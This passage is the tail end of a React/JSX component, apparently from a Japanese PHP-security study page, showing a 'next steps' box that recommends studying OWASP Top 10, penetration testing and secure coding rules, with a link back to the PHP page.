        </div>

        {/* 次のステップ */}
        <div className="mt-8 p-6 bg-purple-600 rounded-xl text-white">
          <h3 className="text-xl mb-3">次のステップ</h3>
          <p className="mb-4">
            基本的なセキュリティ対策を理解したら、OWASP Top 10などのセキュリティガイドラインを学習し、
            ペネトレーションテストツールを使った脆弱性診断、セキュアコーディング規約の策定など、
            より実践的なセキュリティ対策に取り組んでいきましょう。
          </p>
          <Link 
            to="/study/php"
            className="inline-flex items-center gap-2 bg-white text-purple-600 px-6 py-3 rounded-lg font-semibold hover:bg-purple-50 transition-colors"
          >
            PHPページに戻る
          </Link>
        </div>
      </div>
    </div>
  );
}
